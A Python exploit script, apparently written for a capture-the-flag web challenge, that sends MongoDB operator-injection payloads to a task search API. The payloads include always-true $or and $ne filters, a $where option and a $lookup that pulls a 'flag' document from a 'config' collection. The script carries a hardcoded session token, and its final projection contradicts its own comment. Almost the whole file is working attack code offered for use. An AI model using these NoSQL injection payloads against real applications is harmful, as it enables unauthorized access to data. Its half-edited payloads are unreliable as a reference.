import requests
import json

# Configuration
BASE_URL = "http://chal.competitivecyber.club:3002/"  # Replace with the actual base URL
SEARCH_ENDPOINT = "api/v0/tasks/search"
AUTH_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2NmVmZGY1ZDAxYzA2MzYyY2I3NTYyN2YiLCJpYXQiOjE3MjY5OTY1NDUsImV4cCI6MTcyNzAwMDE0NX0.yx1NeIdE6P7osQcSEIJVrygkHS-reglrrMR8JM_7PHI"  # Replace with a valid authentication token

# Headers
headers = {
    "Content-Type": "application/json",
    "Cookie": f"token= {AUTH_TOKEN}"
}

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",  # Even though HTTPS is not used, include for completeness
}

# Malicious Payload
# Objective: Inject a $match stage that always evaluates to true
# This assumes that $match is not disabled in DISABLED_OPERATION_MONGO
# Adjust the payload based on which operators are allowed or disabled

malicious_filter = {
    "$match": {}  # Empty $match matches all documents
}

# Alternatively, to ensure bypassing any specific field constraints,
# you can use operators like $ne to create always-true conditions.

# Example 1: Using $ne to bypass a specific field filter
# malicious_filter = {
#     "someField": { "$ne": None }
# }

# Example 2: Using $where to execute JavaScript (if allowed)
# malicious_filter = {
#     "$where": "1 == 1"  # Always true
# }

# Example 3: Injecting multiple operators if nesting is possible
malicious_filter = {
    "$or": [
        { "username": "admin" },
        { "1": { "$gt": "" } }  # Always true
    ]
}

# malicious_filter = {
#     "$lookup": {
#         "from": "config",
#         "let": {},  # No variables needed
#         "pipeline": [
#             { "$match": { "type": "flag" } },  # Filter to documents where type is 'flag'
#             { "$project": { "value": 1, "_id": 0 } }  # Project only the 'value' field
#         ],
#         "as": "flagData"
#     }
# }



malicious_filter = {
    "$lookup": {
        "from": "config",
        "let": {},  # No variables needed
        "pipeline": [
            { "$match": { "type": "flag" } },  # Filter to documents where type is 'flag'
            { "$project": { "value": 0, "_id": 1 } }  # Project only the 'value' field
        ],
        "as": "flagData"
    }
}

# Send the exploit request


def send_exploit():
    url = BASE_URL + SEARCH_ENDPOINT
    payload = {
        "filter": malicious_filter
    }

    response = requests.get(url, headers=headers, data=json.dumps(payload), proxies=proxies)
    tasks = response.text
    #print("Exploit Successful! Retrieved Tasks:")

if __name__ == "__main__":
    send_exploit()